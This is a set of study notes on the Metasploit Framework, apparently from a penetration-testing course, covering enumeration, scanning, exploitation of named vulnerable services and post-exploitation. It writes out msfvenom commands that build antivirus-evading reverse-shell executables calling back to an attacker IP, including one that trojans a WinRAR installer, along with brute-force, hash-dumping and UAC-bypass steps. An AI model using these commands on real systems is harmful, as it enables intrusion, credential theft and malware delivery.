```toc
```

# Host & Network Penetration Testing: The Metasploit Framework (MSF) #

Topic Overview

+ Introduction to the Metasploit Framework
+ Metasploit Fundamentals
+ Information Gathering and Enumeration With MSF
+ Vulnerability Scanning With MSF
+ Client-Side Attacks with MSF
+ Host and Service Based Exploitation with MSF
+ Post Exploitation With MSF
+ Metasploit GUIs (Graphical User Interfaces )

## Metasploit

### Introduction to the Metasploit Framework

#### Metasploit Framework

+ Open source, robust penetration testing
+ Robust infrastructure, can automate every stage of the penetration testing life cycle
+ Used to develop and test exploits and has one of the worlds largest database of public, tested exploits
+ Designed to be modular, allowing for new functionality to be implemented with ease

The Metasploit framework is open source on GitHub

+ Constantly adding things to it

History of MSF

+ Developed by HD Moore in 2003
+ Originally developed in Perl
+ Rewritten in Ruby 2007
+ Acquired by Rapid7 in 2009
+ Metasploit 5.0 released in 2019
+ Metasploit 6.0 released in 2020

Metasploit Editions

+ Metasploit Pro (Commercial)
+ Metasploit Express (Commercial)
+ Metasploit Framework (Community)

#### Essential Terminology ####

+ **Interface** - Methods of interacting with the Metasploit Framework
	+ MSFconsole, easy to use all in one interface on with `msfconsole` command
	+ MSFcli (Discontinued), use MSFconsole is a cli utility that is used to facilitate the creation of automation scripts that utilize metasploit modules
	+ Metasploit Community Edition is a web based GUI front end that simplifies network discovery and vulnerability identification
	+ Armitage is a free java based GUI front-end for MSF that simplifies network discovery, exploitation and post exploitation
+ **Module** - Pieces of code that perform a particular task, like an exploit
+ **Vulnerability** - Weakness or flaw in a computer system or network that can be exploited
+ **Exploit** - Piece of code/module that is used to take advantage of a vulnerability within a system, service or application
+ **Payload** - Piece of code delivered to the target system by an exploit with the objective of executing arbitrary commands or providing remote access to an attacker
+ **Listener** - A utility that listens for an incoming connection from a target

### Metasploit Framework Architecture ###

A module in the context of MSF is a piece of code that can be utilized by the MSF

+ MSF libraries facilitate the execution of modules without having to write the code necessary in order to execute them  
    ![](MSFArchitecture.png)

#### MSF Modules ####

+ **Exploit** - A module that is used to take advantage of vulnerabilities and is typically paired with a payload
+ **Payload** - Code that is delivered by MSF and remotely executed on the target after successful exploitation. An example of payload is a reverse shell
+ **Encoder** - Used to encode payloads in order to avoid AV detection. For example, `shikata_ga_nai` is used to encode windows payloads
+ **NOPS** - Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed
+ **Auxiliary** - A module that is used to perform additional functionality like port scanning and enumeration
	+ Cant be paired with a payload

#### MSF Payload Types ####

1.  <mark style="background: #FFB86CA6;">Non-Staged Payload</mark> - Payload that is sent to the target system as is along with the exploit
2.  <mark style="background: #FFB86CA6;">Staged Payload</mark> - Sent two the target in two parts
    + The first part (**stager**) contains a payload that is used to establish a reverse connection back to the attacker, download the second part of of the payload (**stage**) and execute it

#### Meterpreter Payload ####

+ Meterpreter or Meta-Interpreter payload is an advanced multi-functional payload that is executed in memory on the target system making it difficult to detect
+ Communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging, and more

#### MSF File System Structure ####
A very organized format
+ Location: `/usr/share/metasploit-framework/`

Module location:
+ MSF modules: `/usr/share/metasploit-framework/modules`
+ Custom user modules: `~/.ms4/modules`

### Penetration Testing With MSF ###

+ MSF can be used to automation various tasks of the penetration testing life cycle
+ Need to understand various phases of a penetration test
+ Can adopt the **PTES** (Penetration Testing Execution Standard)

#### Penetration Testing Execution Standard ####
**PTES** was developed by a team with the aim of addressing the need for a comprehensive and up-to-date standard of penetration testing

Phases diagram:  
![](PTPhases.png)

#### Penetration Testing With MSF ####
![](PTwithMSF.png)

### Installing & Configuring MSF ###

MSF in distributed by Rapid7, can be downloaded and installed on Windows and linux
+ Kali is the better option
+ MSF has dependencies that are pre-packaged with Kali

#### MSF Database ####

+ Metasploit Framework Database (msfdb) is an integral part of MSF, used to keep track of all your assessments, host data scans, etc
+ MSF uses PostgreSQL as the primary database server, will need to ensure that it is running
+ Metasploit Framework Database also facilitates importation and storage of scan results from various third party tools like Nmap and Nessus

### MSFconsole Fundamentals ###

MSFconsole is easy to use and all in one command center
+ Will be the primary interface

What You Need To Know:
1.  How to search for modules
2.  How to select modules
3.  How to configure module options & variables
4.  How to search for payloads
5.  Managing sessions
6.  Additional functionality
7.  Saving your configurations

#### MSF Module Variables ####

+ MSF modules will typically require information like the target & host IP address and port in order to initiate a remote exploit/connection
+ These options can be configured through the use of MSF variables
+ MSFconsole allows you to set both local variable values or global variable values

![](MSFModuleVar.png)

### Creating & Managing Workspaces ###

#### MSF Workspaces ####

+ Allow you to keep track of all your hosts, scans and activities and are extremely useful when conducting penetration tests as they allow you to sort and organize your data based on the target or organization
+ MSFconsole provides you with the ability to create, manage and switch between multiple workspaces depending on your requirements
+ Will use workspaces to organize the assessment as it progresses
	+ Should make a new one for <mark style="background: #FFF3A3A6;">each engagement</mark>

Can see workspace with `workspace` command
+ Will track data

Can make a new one with `workspace -a NAME`
+ Will move you into that new workspace

Can move to a workspace with `workspace NAME`
+ Will want to stay in one per engagement

Can rename workspace with `-r`

## Information Gathering & Enumeration ##

### Port Scanning & Enumeration With Nmap ###

<mark style="background: #FFB86CA6;">Nmap</mark> is a very powerful tool that can be integrated into MSF

#### Nmap ####
+ free and open source scanner
+ Can be used to enumerate the services running on open ports as well as OS 
+ Can output results of NMAP scan to a format that can be imported into MSF for vulnerability detection and exploitation 

Default scan
+ nmap IP

#### Flags ####
+ `Pn`
  + Can turn of ping scanning, which is often blocked with
+ `sV`
  + Enumerate service versions
+ `O`
  + Enumerate OS versions 
+ `oX FILENAME`
  + output file as xml file called FILENAME, can be imported into MSF

### Importing Nmap Scan Results Into MSF ###

Start up <mark style="background: #FF5582A6;">msfconsole</mark>:
+ `service postgresql start`
+ `msfconsole`
+ in msfconsole, can use `db_status` to verify postgresql is running

Will first make a new workspace 
+ `workspace -a NEWNAME`

Import with 
+ `db_import PATH_TO_FILE`
+ confirm with `hosts` to see that the new host shows
+ Can do `services` as well to see the services on the imported host

Can do a nmap scan in the msfconsole with 
+ `db_nmap -FLAGS -IP`
+ Only difference is `db_`

After enumerating, can see vulnerabilities with:
+ `vulns`

### Port Scanning With Auxiliary Modules ###

#### Auxiliary Modules ####
+ Auxiliary modules are used to perform functionality like scanning, discovery, and fuzzing
	+ Can NOT be paired with payloads 
+ Can use for both TCP and UDP port scanning, as well as enumerating information from services like FTP, SSH, HTTP, etc.
+ Auxiliary modules can be used during the information gathering phase of a penetration test, as well as the post exploitation phase 
+ Can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a target system 

#### Port scan ####
Can search for port-scan with the `search`
+ For standard TCP: `use auxiliary/scanner/portscan/tcp`
+ to see options: `show options`
+ set target with: `set RHOSTS 192.216.35.3`
+ to execute: `run`

If it is running a web server, can use `curl` to get that HTML

#### Scanning on another machine (Pivoting) ####
After an exploit is done to get a meterpreter session on another machine, can now start scanning on that subnet 
+ to get a shell on a linux machine: 
	+ `shell`, then...
	+ `/bin/bash -i`
+ can then get the new ip with `ifconfig`
+ Use ^c to get back the the meterpreter 

Will now add the route with:
+ `run autoroute -s IP_OF_NEW_MACHINE`
	+ allow us to attack this second network through our first compromised machine by adding the path 
+ when done, can put it in the background with `background`/`bg` and view background sessions with `sessions`

Can now run a port-scan as normal on a range or machine in the new subnet with `use auxiliary/scanner/portscan/tcp` or any other port scanner like `udp_sweep`

### FTP Enumeration ###

+ FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients
+ Frequently used as a means of transferring files to and from the directory of a web server 
+ Can also use multiple auxiliary modules to enumerate information as well as perform brute-force attacks on targets running an FTP server 
+ FTP authentication utilizes a username and password combination, however, in some cases an improperly configured FTP server can be logged into anonymously 

#### FTP Enumeration Steps ####
+ will first do a normal port-scan such as standard TCP: `use auxiliary/scanner/portscan/tcp`
	+ In order to see if ftp is running, port 21
+ can now find a FTP scan with: `search type:auxiliary name:ftp`
	+ `auxiliary/scanner/ftp/ftp_version` is a good one for version scanning 
		+ Once the version is seen, can use `search` to see if there are any exploits 
+ `auxiliary/scanner/ftp/ftp_login` is good for <mark style="background: #FFF3A3A6;">bruteforce</mark> 
	+ will want to also provide a PASS_FILE and USER_FILE:
	+ `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
	+ `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+ `auxiliary/scanner/ftp/anonymous` is for checking if anonymous access is possible
+ Once FTP credentials are retrieved, can interact with: `ftp IP`, and then enter username and password
	+ can use `get` to download files 

### SMB Enumeration ###

+ <mark style="background: #ADCCFFA6;">SMB</mark> (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN
+ SMB uses port 445 (TCP), however it originally ran on top of NetBIOS using port 139
+ Samba is the linux implementation of SMB, and allows Windows systems to access Linux shares and devices
+ Can utilize auxiliary modules to enumerate the SMB version, shares, users and perform a brute-force attack in order to identify users and passwords

#### SMB Enumeration Steps ####

+ Will first make a global variable for the target
	+ `setg RHOSTS TARGET_NAME`
+ Will search for smb auxiliary modules
	+ `search type:auxiliary name:smb`
+ Will now use modules to get the version, enumerate users. enumerate shares, brute-force (or smb_login)
	+ can get more information about a module with `info`
+ Once credentials are gotten, should switch to <mark style="background: #D2B3FFA6;">smbclient</mark> to interact with it 

### Web Server Enumeration ###

+ HTTP typically uses 80, or secured with 443 (HTTPS)
+ Will want headers, versions, enumerations, directory/file brute-forcing

#### Web Server Enumeration Steps ####
+ Will want to set global RHOST and RHOSTS
	+ `setg RHOSTS TARGET`
	+ `setg RHOST TARGET`
+ Will search for http auxiliary modules
	+ `search type:auxiliary name:http`
+ From there will run the following:
	+ `http_version` to get server version
	+ `http_header` to get the header that can sometimes leak info
	+ `robots_txt` will run through that file normally stored at the root which will usually contain files the developer wants to be kept secure 
	+ `dir_scanner` will run a directory brute force to see what all is on it 
	+ `files_dir` will brute force files on the web server 
	+ `http_login` allows for a brute-force on a login page 
	+ `apache_userdir_enum` works because apache servers with UserDir directive enabled will generate different error codes when the user exists and does not exist, which can allow an attacker to determine valid usernames 
+ Note that the <mark style="background: #D2B3FFA6;">curl</mark> command works in msfconsole 

### MySQL Enumeration ###

+ An open source database management system
+ Stores records, commonly for web application data
+ MySQL utilizes TCP port 3306 by default
+ Can utilize auxiliary modules to enumerate the version of MySQL, perform brute-force attacks to identify passwords, and execute SQL queries, and more 

### MySQL Enumeration Steps ###

Will do the normal beginning steps:
+ `service postgresql start`
+ `msfconsole`
+ make a new works space `workspace -a NEWNAME`
+ set up the global targets with:
	+ `setg RHOST target`
	+ `setg RHOSTS target`

Will now get into enumeration:
+ Will first verify the port SQL is running with `portscan/tcp`
+ Will search for MySQL auxiliary modules
	+ `search type:auxiliary name:mysql`
+ `mysql_version` will enumerate the version
+ `mysql_login` will brute-force for legitimate credentials
	+ will very often use root as the **username**, and **unix_passwords.txt***\ for the passwords
+ `mysql_enum` with those credentials, can enumerate the database server
+ `mysql_sql` allows for execution of sql queries 
	+ A good query would be `show databases;`
+ `mysql_schemadump` extracts the schema information
	+ shows tables in databases to target our queries 

Can now go through and see what we got:
+ `hosts`
+ `services`
+ `loot`
+ `creds`

With the credentials, can leave msfconsole and switch to mysql
+ `mysql -h TARGET_IP -u USERNAME`
	+ can now run any sql query 

### SSH Enumeration ###

+ <mark style="background: #ADCCFFA6;">SSH</mark> is an encrypted remote CLI access
+ Useful for servers and systems
+ TCP port 22
+ Can utilize auxiliary modules to enumerate the version of SSH running on the target, brute-force attacks to identify passwords that will allow remote access 

#### SSH Enumeration Steps ####

Will do the normal beginning steps:
+ `service postgresql start`
+ `msfconsole`
+ make a new works space `workspace -a NEWNAME`
+ set up the global targets with:
	+ `setg RHOST target`
	+ `setg RHOSTS target`

Enumeration:
+ Will search for SSH auxiliary modules
	+ `search type:auxiliary name:mysql`
+ `ssh_version` will get version info for SSH as well as OS info
+ `ssh_login` is for password authentication and brute-forcing
	+ once in, can spawn a bash session with `/bin/bash -i`
+ `ssh_login_pubkey` is for key pair authentication and brute-forcing
+ `ssh_enumusers` can enumerate users to have a more target brute-force 

### SMTP Enumeration ###

+ <mark style="background: #ADCCFFA6;">Simple Mail Transfer Protocol</mark> used for email transmission 
+ TCP port 25, can also be on 465 and 587
+ can enumerate versions as well as user accounts with auxiliary modules

#### SMTP Enumeration Steps ####

Will do the normal beginning steps:
+ `service postgresql start`
+ `msfconsole`
+ make a new works space `workspace -a NEWNAME`
+ set up the global targets with:
	+ `setg RHOST target`
	+ `setg RHOSTS target`

Enumeration:
+ Will search for SMTP auxiliary modules
	+ `search type:auxiliary name:smtp`
+ `smtp_version` will get version
+ `smtp_enum` will do user enumeration 
	+ because SMTP has a verify user service that can be exploited 

## Vulnerability Scanning ##

### Vulnerability Scanning With MSF ###

#### About Vulnerability Scanning ####
+ Detect vulnerabilities and verify whether they can be exploited
+ Can also utilize third party vulnerability scanning tools like Nessus to integrate with MSF

#### Scanning ####

Will do the normal beginning steps:
+ `service postgresql start`
+ `msfconsole`
+ make a new works space `workspace -a NEWNAME`
+ set up the global targets with:
	+ `setg RHOST target`
	+ `setg RHOSTS target`

Now will move into scanning
+ Will start by doing nmap from msfconsole 
	+ `db_nmap -sS -sV -O TARGET_IP`
		+ `-sS` <mark style="background: #FFF3A3A6;">syn</mark> or stealth scan
		+ `-sV` version detection
		+ `-O` OS detection
+ `hosts` and `services` will now be populated with what was found
+ can now use `search` to look for exploits based on the service version or OS versions
+ To check if a system is vulnerable to an exploit, will `user EXPLOITNAME`
	+ Then will use `info` to see if the descriptions shows that the version is vulnerable
	+ will now configure everything required in `show options`
	+ Some exploits will also have a `scanner` option to see if the system is vulnerable 
+ `searchsploit` can be used to look for exploits in metasploit or other places 
	+ This is not done in msfconsole, rather the normal command line
	+ can `| grep -e "Metasploit"` to only get metasploit exploits

`metasploit-autopwn` is a `db_autopwn` plugin on <mark style="background: #BBFABBA6;">Github</mark> that will identify exploit modules that correspond with the services found 
+ Will need to `load db_autopwn`
+ Then will run `db_autopwn` to see the options
+ Best search is to target specific services:
	+ `db_autopwn -p -t -PI PORT_NUMBER`
		+ `-p` looks through all ports
		+ `-t` shows all matching exploit modules
		+ `PI` will narrow it down even more based on port 

`analyze` command will look through content of the database and identify what exploits might be available
+ can now type in `vulns` and see what might be vulnerable 

### Vulnerability Scanning With Nessus ###

+ Nessus is a proprietary vulnerability scanner 
+ can automate vulnerability scanning and can identify vulnerabilities 
+ Free version of Nessus allows to scan up to 16 IPs

#### Nessus Scanning ####

+ Will download from tenable.com, and install
+ Will interact with it from the browser, on `127.0.0.1:8834`
	+ can start a download from there 

Will start a scan if some sort, and wait for it to complete 
+ Will now have various vulnerabilities available to view
+ can also filter for metasploit exploits with the filter drop down 
+ Will export when done

Will do the normal beginning steps:
+ `service postgresql start`
+ `msfconsole`
+ make a new works space `workspace -a NEWNAME`
+ set up the global targets with:
	+ `setg RHOST target`
	+ `setg RHOSTS target`

can now use `db_import /Location/SCANNAME.nessus`
+ can use `host`, `services`, and `vulns` to see what is available 
	+ may need to specify a port `-p` to look at specific service vulns.
+ With the CVE, can do a `search` to find available exploits 
	+ Example : `search cve:2017 name:smb`
+ Or can see a vulnerability in Nessus and search it in msfconsole

### Web App Vulnerability Scanning With WMAP ###

+ WMAP is a powerful, feature-rich web application vulnerability scanner that can automate web server enumeration and scan web applications for vulnerabilities 
+ WMAP is available as an MSF plugin and can be loaded directly into MSF
+ Fully integrated with MSF, so can perform web app vulnerability scanning from within the MSF

#### WMAP Scanning ####

Will do the normal beginning steps:
+ `service postgresql start`
+ `msfconsole`
+ make a new works space `workspace -a NEWNAME`
+ set up the global targets with:
	+ `setg RHOST target`
	+ `setg RHOSTS target`

Using <mark style="background: #D2B3FFA6;">wmap</mark>
+ will first `load wmap`
+ Can now type `wmap_`, then hit tab, and will see the options available 
+ Can add a site with `wmap_sites -a IP`
+ Can add a target with `wmap_targets -t http://IP/`
	+ can include any directory needed 
+ can see `wmap_run -t` too see all the modules that can be scanned for
+ `wmap_run -e` will run all of that is available 
+ can list all found vulnerabilities with `wmap_vulns -l`
	+ `auxiliary/scanner/http/http_put` is a good example of a vulnerability scanner that looks to see if an attacker can use the PUT method on a directory
		+ can be used to upload a web payload


## Client-Side Attacks ##

+ A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed 
+ Client-side typically utilizes various social engineering techniques like generating malicious documents or portable executables (PEs)
+ Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system
+ Given that this attack vector involves the transfer and storage of a malicious payload on the clients system (disk), attackers need to be cognizant of AV detection 

### Generating Payloads With Msfvenom ###

#### Msfvenom ####
+ <mark style="background: #D2B3FFA6;">Msfvenom</mark> is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers
+ Combines utilities: `msfpayload` and `msfencode`
+ Can generate meterpreter payload that can be transferred to the client system, will then connect back

<mark style="background: #FF5582A6;">Payloads</mark>
+ Can see all payloads with `msfvenom --list payloads`
+ Will specify payload via `OS_TYPE/ARCHITECTURE/PAYLOAD_TYPE/PROTOCOL`
	+ Example: `windows/x64/meterpreter/reverse_http`
+ Staged vs Not-Staged Payload:
	+ Will know that the payload is staged because the PAYLOAD_TYPE and PROTOCOL will be separated by a `/` not a `_`
	+ Staged Meterpreter payload contain shell code that performs network communications in order to read in the second stage 
+ Example: `msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.107 lport=6001 -f exe > securitytutorials.exe`
  + `-a` specifies architecture 
  + `-p` lets you specify which payload you want to use
  + `lhost` this needs to be the attackers IP address you want the payload to connect back to
  + `lport` as above; this is the port the payload will connect on and will need to be set up in the handler
  + `-f` this tells Msfvenom what it should create the payload as

Simple <mark style="background: #FFF3A3A6;">Webserver to Transfer Files</mark>
+ `sudo python -m SimpleHTTPServer 80`

<mark style="background: #FF5582A6;">Handler</mark>
+ In msfconsole, will `use multi/handler`
  + will then `set payload PAYLOAD_GENERATED`

### Encoding Payloads With Msfvenom ###

+ Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection 
+ Most end user AV solutions utilize signature based detection in order to identify malicious files or executables
+ Can evade older signature based AV solutions by encoding the payloads 
+ Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature 

#### Shellcode ####
+ <mark style="background: #ADCCFFA6;">Shellcode</mark> (shell-code) is a piece of code typically used as payload for exploitation 
+ Gets its name from the term command shell, shellcode is a piece of code that provides an attacker with remote command shell on the target system

#### Encoding ####
+ Can view all encoders with `msfvenom --list encoders`
	+ The best being `x86/shikata_ga_nai` encoder which is Polymorphic or `cmd/powershell_base64` for power-shell
+ Example: `msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.107 lport=6001 -i 10 -e x86/shikata_ga_nai -f exe > securitytutorials.exe`
	+ Where the `-e` is to specify encoding 
	+ `-i` specifies the number of iterations it will encode it 
		+ not much better after 10

### Injecting Payloads Into Windows Portable Executables ###

+ Will first find a legitimate portable executable 
	+ WinRAR setup file is one of the most popular 
		+ https://www.win-rar.com/download.html?&L=0
+ Then `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT:PORT -i 10 -e x86/shikata_ga_nai -f exe -x wrar602.exe > payloads/winrar.exe`
	+ `-x`: Specify a custom executable file to use as a template
	+ `-k`: Preserve the --template behavior and inject the payload as a new thread
		+ Very often does not work

### Automating Metasploit With Resource Scripts ###

#### Metasploit Resource Scripts ####
+ Metasploit resource scripts allow automation of repetitive tasks and commands 
+ Similar to batch script, can specify a set of Msfconsole commands that execute sequentially 
+ Can load the script with Msfconsole and automate the execution 
+ Can be used for multi-handlers as well as loading and executing payloads

Prepackaged metasploit scripts found in `ls -al /usr/share/metasploit-framework/scripts/resource`

#### Making and Using Metasploit Resource Scripts ####

+ To make one, will make a file with the `.rc` and populated with the commands needed to be run in order
![](MSFScript.png)
+ Can also automate a task just ran in msfconsole by using `makerc /PATH/SCRIPT.rc`
+ Will save commands typed 
+ To use one, will use `msfconsole -r SCRIPT.rc`
	+ Can also so it within msfconsole by using `resource /PATH/SCRIPT.rc`

# Metasploit Exploitation #

## Windows Exploitation ##

### Exploiting A Vulnerable HTTP File Server ###

#### HTTP File Server ####
+ (HFS) is a web server that is designed for file and document sharing
+ Runs on TCP port 80, and utilizes the HTTP protocol 
+ <mark style="background: #ADCCFFA6;">Rejetto</mark> HFS is popular free and open source, V2.3 is vulnerable to remote command execution attack
+ MSF has an exploit module to access the target
	+ May have to change the payload architecture after using sys-info (will automatically do x32, may need to upgrade to x64)

### Exploiting Windows MS17-010 SMB Vulnerability ###

Very well known vulnerability, part of a WannaCry ransomware attack. Affected hospitals, governments, etc. Took advantage of SMB with a buffer overflow
+ Alleged that the US National Security Agency created the exploit and an insider threat released the tool kit and was exploited by threat actors
+ A young researcher, Marcus Hutchins, found out the kill code for the WannaCry virus 

SMBv1 servers in older Windows versions are vulnerable
+ The OS itself needed to be patched 

#### MSF EternalBlue ####
+ There is a module on msfconsole to scan for and exploit a target
+ Will give a privileged meterpreter session 

### Exploiting WinRM (Windows Remote Management Protocol) ###

#### WinRM ####
+ Similar to SSH, can access windows systems remotely 
+ Used in the following ways:
	+ Remote access and interact with Windows hosts on a local network
	+ Remotely access and execute commands from the internet
	+ Manage and configure Windows systems remotely 
+ WinRM typically uses TCP port 5985 and 5986 (HTTPS)

#### Exploiting WinRM ####
+ WinRM implements access control and security for communication between systems through various forms of authentication 
+ Can utilize the MSF to identify WinRM users and their passwords as well as execute commands on the target system
+ Can use MSF WinRM exploit module to obtain a meterpreter session on the target system

After verifying the service is running, will do the following:
+ Verify auth-methods with: `auxiliary/scanner/winrm/winrm_auth_methods`
+ Can <mark style="background: #FFF3A3A6;">bruteforce</mark> it with `auxiliary/scanner/winrm/winrm_login`
+ With credentials, can use `auxiliary/scanner/winrm/winrm_cmd` to run a command
	+ Can specify a command to be ran like `whoami`
+ To get a meterpreter session: `exploit/windows/winrim/winrm_script.exec`

### Exploiting A Vulnerable Apache Tomcat Web Server ###

#### Apache Tomcat ####
+ Known as Tomcat server, popular, free and open source Java servlet web server
+ Build and host dynamic websites and web applications based on the Java software platform 
+ Utilizes the HTTP protocol 
+ Runs on port 8080 by default
+ Apache Tomcat is different then Apache because it is dynamic and in java 
	+ V8.5.19 is vulnerable to remote code execution via `jsp`
+ MSF has an exploit module 

#### Exploiting Apache Tomcat ####

After verifying Apache Tomcat is running:
+ Will use remote code execution with: `exploit/multi/http/tomcat_jsp_upload_bypass`
	+ can set the payload as `java/jsp_shell_bind_tcp` and `set SHELL cmd`
+ To upgrade to meterpreter, will generate a windows meterpreter session with msfvenom:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > meterpreter.exe`
	+ Will transfer that over to the target and download the executable 
	+ `certutil` will allow downloads from a webserver
+ Will now set up `mutli/handler`, and the run the exe

## Linux Exploitation ##

### Exploiting A Vulnerable FTP Server ###

#### FTP ####
+ Protocol that uses TCP port 21 and used to facilitate file sharing 
+ Frequently used as a means of transferring files
+ <mark style="background: #ADCCFFA6;">vsftpd</mark> is an FTP sever for Unix-like system including Linux systems and is the default FTP server for Ubuntu, CentOS and Fedora
+ <mark style="background: #ADCCFFA6;">vsftpd</mark> V2.3.4 is a vulnerable to a command execution vulnerability that facilitate a backdoor that was added to the <mark style="background: #ADCCFFA6;">vsftpd</mark> download archive through a supply chain attack 
  + can open up a bash with `/bin/bash -i`
  + Will then use `post/multi/manage/shell_to_meterpreter` to upgrade to meterpreter 

### Exploiting Samba ###

#### Samba ####
+ SMB is a network and file sharing protocol 
+ SMB uses port 445, originally ran on top of NetBIOS using port 139
+ Samba is the linux implementation of SMB
+ Samba V3.5.0 is vulnerable to remote code execution vulnerability 

#### Exploiting Samba ####
+ `exploit/linux/samba/is_known_pipename` is Rank Excellent and will give CLI access 
	+ can open up a bash with `/bin/bash -i`
	+ Will then use `post/multi/manage/shell_to_meterpreter` to upgrade to meterpreter

### Exploiting A Vulnerable SSH Server ###

#### SSH ####
+ Secure Shell on 22
+ For remote access 
+ <mark style="background: #FFF3A3A6;">libssh</mark> is a C library implementing the SSHv2 protocol on client and server side
+ <mark style="background: #FFF3A3A6;">libssh</mark> V0.6.0-0.8.0 is vulnerable to authentication bypass vulnerability 

#### Exploiting SSH ####

+ use `auxiliary/scanner/ssh/libssh_auth_bypass` to take advantage of the vulnerability 
	+ Will want to set `SPAWN_PTY` to true to get a terminal
	+ Will then use `post/multi/manage/shell_to_meterpreter` to upgrade to meterpreter

### Exploiting A Vulnerable SMTP Server ###

#### SMTP ####
+ SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of emails
+ Uses TCP port 25 by default, it can also be configured to run on 465 and 587 
+ <mark style="background: #ADCCFFA6;">Haraka</mark> is an open source high performance SMPT server developed in Node.js
+ The <mark style="background: #ADCCFFA6;">Haraka</mark> SMPT server comes with a plugin for processing attachment, V2.8.9 and below are vulnerable to command injection 

#### Exploiting Haraka SMTP ####
+ will use: `linux/smtp/haraka`
+ After filling out the options, will need to set a payload such as `linux/x64/meterpreter_reverse_http`, and the LHOST associated with the payload 

## Post Exploitation Fundamentals ##

### Post Exploitation ###

![](PostExploit.png)
+ Post exploitation refers to the action performed on the target system after initial access has been obtained 
+ The post exploitation phase of a penetration test consists of various techniques like:
	+ Local Enumeration
	+ Privilege Escalation
	+ Dumping Hashes
	+ Establishing Persistence 
	+ Clearing Your Tracks 
	+ Pivoting

### Meterpreter Fundamentals ###

#### Meterpreter ####
+ The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload the operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect
+ It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more
+ Meterpreter also allows us to load custom scripts and plugins dynamically
+ MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the oS architecture.
+ can use `help` to see what is available
+ See the following cheatsheet
![](Metasploit-Cheat-Sheet.webp)

### Upgrading Command Shells to Meterpreter Shells ###

The first step after getting a command shell will usually include doing `/bin/bash -i` which will begins a bash session
+ Can now upgrade with <mark class="hltr-red">shell_to_meterpreter</mark>:
	+ `use post/multi/manage/shell_to_meterpreter` 
+ Can now use `sessions` to switch to it 

As an alternative, can use that module using only the <mark class="hltr-yellow">-u</mark> after sessions 
+ Example: `sessions -u 1`
	+ Where session one is being upgraded

## Windows Post Exploitation ##

### Windows Post Exploitation Modules ###

#### Windows Post Exploitation Modules ####
+ The MSF provides us with various post exploitation modules for both Windows and Linux 
+ Can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to:
	+ Enumerate user privileges 
	+ Enumerate logged on users
	+ VM check
	+ Enumerate installed programs
	+ Enumerate AVs (Anti Virus)
	+ Enumerate computers connected to domain 
	+ Enumerate installed patches
	+ Enumerate shares

#### Windows Post Exploitation Methodology ####
+ Will first do: `sysinfo`
	+ Gives name, OS, architecture, domain, meterpreter 
+ `getuid` will show important user information related to your access
+ `help` will show meterpreter options related to windows
+ `getsystem` will try and elevate privileges 
	+ can verify it wored with `getuid`
+ `hashdump` to try and dump hashes
+ `show mount` will show drives/mounts 
+ `ps` will show all  the processes 
+ can migrate to another process with `migrate [PID]`

#### Windows Post Exploitation Modules Example ####
<mark class="hltr-green">Note</mark>: Running these commands will store information in loot, which can be accessed with `loot`
+ May need to migrate meterpreter architecture with <mark class="hltr-red">archmigrate</mark>
	+ `use windows/manage/archmigrate`
	+ Will spawn a compatiable process
+ Can enumerate privileges with <mark class="hltr-red">win_privs</mark>
	+ `use post/windows/gather/win_privs`
	+ Will list information about the current user as well as the actual privilege names 
+ See what users are currently logged on with <mark class="hltr-red">enum_logged_on</mark>
	+ `use post/windows/gather/enum_logged_on_users`
	+ Will see who is frequently logged on or currently logged on 
		+ Will give a heads up to see if we are being watched or noticed
+ Can check if it is a VM with <mark class="hltr-red">checkvm</mark>
	+ `use enum_applications`
	+ Will allow us to know if we need to do a VM breakout 
+ Enumerate programs with <mark class="hltr-red">enum_applications</mark>
	+ `use post/windows/gather/enum_applications
	+ Will also show versions 
+ Can check antivirus and excluded folders that the antivirus does not scan with <mark class="hltr-red">enum_av_excluded</mark>
	+ `use post/windows/gather/enum_av_excluded`
	+ Can set if it is Defender, Essentials, or SEP
+ Enumerate computers in the domain with <mark class="hltr-red">enum_computers</mark>
	+ `use post/windows/gather/enum_computers`
+ Search for installed patches with <mark class="hltr-red">enum_patches</mark>
	+ `use post/windows/gather/enum_patches`
	+ Can specify your **own** list, but will also have default 
	+ Can also use the `shell` command to get a **powershell** and use `systeminfo` which can give patch information ***manually*** 
+ Enumerate shares with <mark class="hltr-red">enum_shares</mark>
	+ `use post/windows/gather/enum_shares`
	+ These will be SMB shares, such as printers of files
+ Check if RDP is running, or enable rdp with <mark class="hltr-red">enable_rdp</mark>
	+ `use post/windows/manage/enable_rdp` 

### Windows Privilege Escalation: Bypassing UAC ###

#### UAC ####
+ <mark class="hltr-yellow">User Account Control</mark> (UAC), a Windows security feature introduced in Windows Vista that prevents unauthorized changes from being made to the OS
+ Used to ensure that changes to the OS require approval from the admin
+ Can utilize "**Windows Escalate UAC Protection Bypass (In Memory Injection)**" module to bypass UAC by utilize the trusted publisher certificate through process injection 
	+ Will spawn a second shell that has the UAC flag turned off 
	+ Requires x64 merterpreter session
		+ Example: `set payload windows/x64/meterpreter/reverse_tcp`


![[UAC 1.png]]

#### UAC Exploit####
+ Will want to check if the current user is an administrator first with `net localgroup administrators` in a shell session on the target
+ Can now use <mark class="hltr-red">bypassuac_injection</mark>  
